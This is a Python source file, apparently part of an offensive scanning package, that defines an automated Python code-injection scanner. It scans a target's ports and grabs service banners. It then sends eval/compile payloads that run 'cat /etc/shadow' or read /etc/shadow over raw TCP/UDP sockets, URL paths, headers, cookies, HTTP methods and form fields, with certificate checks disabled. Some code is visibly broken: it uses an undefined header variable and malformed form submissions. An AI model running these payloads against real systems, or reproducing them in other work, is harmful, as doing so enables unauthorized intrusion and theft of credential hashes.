import random
import re
import socket
import ssl
import time
import urllib.parse
import urllib.request
from TheSilent.clear import clear
from TheSilent.dolphin_scanner import dolphin_scanner
from TheSilent.return_user_agent import return_user_agent

verify = ssl.create_default_context()
verify.check_hostname = False
verify.verify_mode = ssl.CERT_NONE

RED = "\033[1;31m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"

def melon_scanner(url,delay=0):
    clear()
    payload_list = []
    host_list = [url]

    try:
        my_request = urllib.request.Request(url + "/sitemap.xml", method="GET")
        my_request.add_header("User-Agent",return_user_agent())
        my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
        my_request.add_header("Accept-Encoding","deflate")
        my_request.add_header("Accept-Language","en-US,en;q=0.5")
        my_request.add_header("Referer","https://www.google.com/")
        my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
        simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
        xml_list = re.findall("http\S+<", simple_response)
        for xml in xml_list:
            result = xml.split("<")[0]
            result = result.split("'")[0]
            result = result.split('"')[0]
            result = re.sub("/$", "", result)
            host_list.append(result)

    except:
        pass

    host_list = list(set(host_list[:]))
    host_list.sort()

    mal_python = [r"eval(compile('import os\nos.system(\'sudo cat /etc/shadow\')', 'melon', 'exec'))",
                      r"eval(compile('import os\nos.system(\'cat /etc/shadow\')', 'melon', 'exec'))",
                      r"eval(compile('import os\ndef melon():\n    data = open(\'/etc/shadow\',\'r\')\n    data = data.read()\n    return data\nprint(melon())', 'melon', 'exec'))"
                      ]

    for host in host_list:
        print(CYAN + f"checking: {host}")
        port_list = dolphin_scanner(host,delay)
        new_host = host.replace("https://", "")
        new_host = new_host.replace("http://", "")

        # get banners using tcp
        port_list = random.sample(port_list[:], len(port_list[:]))
        for port in port_list:
            print(f"grabbing banner on {port}/tcp")
            time.sleep(delay)
            try:
                my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                my_socket.settimeout(5)
                my_socket.connect((new_host,port))
                data = str(my_socket.recv(65536))
                my_socket.close()
                if len(data) > 0:
                    payload_list.append(data)

            except:
                my_socket.close()
                continue

        # get banners using udp
        port_list = random.sample(port_list[:], len(port_list[:]))
        for port in port_list:
            print(f"grabbing banner on {port}/udp")
            time.sleep(delay)
            try:
                my_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                my_socket.settimeout(5)
                my_socket.sendto(b"", (new_host,port))
                data = str(my_socket.recvfrom(65536))
                if len(data) > 0:
                    payload_list.append(data)

            except:
                continue

        # test for python injection using tcp
        port_list = random.sample(port_list[:], len(port_list[:]))
        for port in port_list:
            print(f"checking for python injection on {port}/tcp")
            for mal in mal_python:
                time.sleep(delay)
                try:
                    my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    my_socket.settimeout(5)
                    my_socket.connect((new_host,port))
                    my_socket.send(mal.encode())
                    data = str(my_socket.recv(65536))
                    my_socket.close()
                    if "cat /etc/shadow" in mal and "root" in data.lower() and "daemon" in data.lower():
                        payload_list.append(f"{port}/tcp: {mal}")

                    if "data.read()" in mal and "root" in data.lower() and "daemon" in data.lower():
                        payload_list.append(f"{port}/tcp: {mal}")

                except:
                    my_socket.close()
                    continue

        # test for python injection using udp
        port_list = random.sample(port_list[:], len(port_list[:]))
        for port in port_list:
            print(f"checking for python injection on {port}/udp")
            for mal in mal_python:
                time.sleep(delay)
                try:
                    my_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    my_socket.settimeout(5)
                    my_socket.sendto(mal.encode(), (new_host,port))
                    data = str(my_socket.recvfrom(65536))
                    if "cat /etc/shadow" in mal and "root" in data.lower() and "daemon" in data.lower():
                        payload_list.append(f"{port}/udp: {mal}")

                    if "data.read()" in mal and "root" in data.lower() and "daemon" in data.lower():
                        payload_list.append(f"{port}/udp: {mal}")

                except:
                    continue
        
        # test for python injection in url
        print(CYAN + "checking for python injection in url")
        for mal in mal_python:
            time.sleep(delay)
            start = time.time()
            try:
                my_request = urllib.request.Request(host + f"/{urllib.parse.quote(mal)}", method="GET")
                my_request.add_header("User-Agent",return_user_agent())
                my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                my_request.add_header("Accept-Encoding","deflate")
                my_request.add_header("Accept-Language","en-US,en;q=0.5")
                my_request.add_header("Referer","https://www.google.com/")
                my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
                if "cat /etc/shadow" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                    payload_list.append(f"url: {mal}")

                if "data.read()" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                    payload_list.append(f"url: {mal}")
                    

            except:
                continue

        # test for python injection in headers
        print(CYAN + "checking for python injection in headers")
        time.sleep(delay)
        for mal in mal_python:
            time.sleep(delay)
            try:
                my_request = urllib.request.Request(host, method="GET")
                my_request.add_header("User-Agent",return_user_agent())
                my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                my_request.add_header("Accept-Encoding","deflate")
                my_request.add_header("Accept-Language","en-US,en;q=0.5")
                my_request.add_header("Referer","https://www.google.com/")
                my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                my_request.add_header(head,mal)
                simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
                if "cat /etc/shadow" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                    payload_list.append(f"headers: {mal}")

                if "data.read()" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                    payload_list.append(f"headers: {mal}")

            except:
                continue
            
        # test for python injection in cookie
        print(CYAN + "checking for python injection in cookie")
        for mal in mal_python:
            time.sleep(delay)
            try:
                my_request = urllib.request.Request(host, method="GET")
                my_request.add_header("User-Agent",return_user_agent())
                my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                my_request.add_header("Accept-Encoding","deflate")
                my_request.add_header("Accept-Language","en-US,en;q=0.5")
                my_request.add_header("Referer","https://www.google.com/")
                my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                my_request.add_header("Cookie",mal)
                simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
                if "cat /etc/shadow" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                    payload_list.append(f"cookie: {mal}")

                if "data.read()" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                    payload_list.append(f"cookie: {mal}")

            except:
                continue

        # test for python injection in method
        print(CYAN + "checking for python injection in method")
        for mal in mal_python:
            time.sleep(delay)
            try:
                my_request = urllib.request.Request(host, method=mal)
                my_request.add_header("User-Agent",return_user_agent())
                my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                my_request.add_header("Accept-Encoding","deflate")
                my_request.add_header("Accept-Language","en-US,en;q=0.5")
                my_request.add_header("Referer","https://www.google.com/")
                my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
                if "cat /etc/shadow" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                    payload_list.append(f"method: {mal}")

                if "data.read()" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                    payload_list.append(f"method: {mal}")

            except:
                continue

        # test for python injection in forms
        print(CYAN + "checking for python injection in forms")
        form_list = []
        for mal in mal_python:
            time.sleep(delay)
            try:
                my_request = urllib.request.Request(host, method="GET")
                my_request.add_header("User-Agent",return_user_agent())
                my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                my_request.add_header("Accept-Encoding","deflate")
                my_request.add_header("Accept-Language","en-US,en;q=0.5")
                my_request.add_header("Referer","https://www.google.com/")
                my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
                input_form = re.findall("<input.+>", simple_response.lower())
                method = re.findall("method.?=.?[\"\'](\S+)[\"\']", simple_response.lower())[0]
                for field in input_form:
                    form_id = re.findall("id.?=.?[\"\'](\S+)[\"\']", field.lower())[0]
                    form_name = re.findall("name.?=.?[\"\'](\S+)[\"\']", field.lower())[0]
                    form_list.append(form_id)
                    form_list.append(form_name)

                form_list = list(set(form_list))
                form_list.sort()
                for field in form_list:
                    time.sleep(delay)
                    if method == "get":
                        my_request = urllib.request.Request(host, method="GET")
                        my_request.add_header("User-Agent",return_user_agent())
                        my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                        my_request.add_header("Accept-Encoding","deflate")
                        my_request.add_header("Accept-Language","en-US,en;q=0.5")
                        my_request.add_header("Referer","https://www.google.com/")
                        my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                        simple_response = str(urllib.request.urlopen(my_request,context=verify,data={field:mal},timeout=15).read())
                        if "cat /etc/shadow" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                            payload_list.append(f"forms: {mal}")

                        if "data.read()" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                            payload_list.append(f"forms: {mal}")

                    if method == "post":
                        my_request = urllib.request.Request(host, method="POST")
                        my_request.add_header("User-Agent",return_user_agent())
                        my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                        my_request.add_header("Accept-Encoding","deflate")
                        my_request.add_header("Accept-Language","en-US,en;q=0.5")
                        my_request.add_header("Referer","https://www.google.com/")
                        my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                        simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
                        simple_response = str(urllib.request.urlopen(my_request,context=verify,data={field:mal},timeout=15).read())
                        if "cat /etc/shadow" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                            payload_list.append(f"forms: {mal}")

                        if "data.read()" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                            payload_list.append(f"forms: {mal}")

                    if method == "put":
                        my_request = urllib.request.Request(host, method="PUT")
                        my_request.add_header("User-Agent",return_user_agent())
                        my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                        my_request.add_header("Accept-Encoding","deflate")
                        my_request.add_header("Accept-Language","en-US,en;q=0.5")
                        my_request.add_header("Referer","https://www.google.com/")
                        my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                        simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
                        simple_response = str(urllib.request.urlopen(my_request,context=verify,data={field:mal},timeout=15).read())
                        if "cat /etc/shadow" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                            payload_list.append(f"forms: {field}:{mal}")

                        if "data.read()" in mal and "root" in simple_response.lower() and "daemon" in simple_response.lower():
                            payload_list.append(f"forms: {field}:{mal}")

            except:
                continue

    clear()
    if len(payload_list) > 0:
        for payload in payload_list:
            print(RED + payload)

    else:
        print(GREEN + "this server is secure")
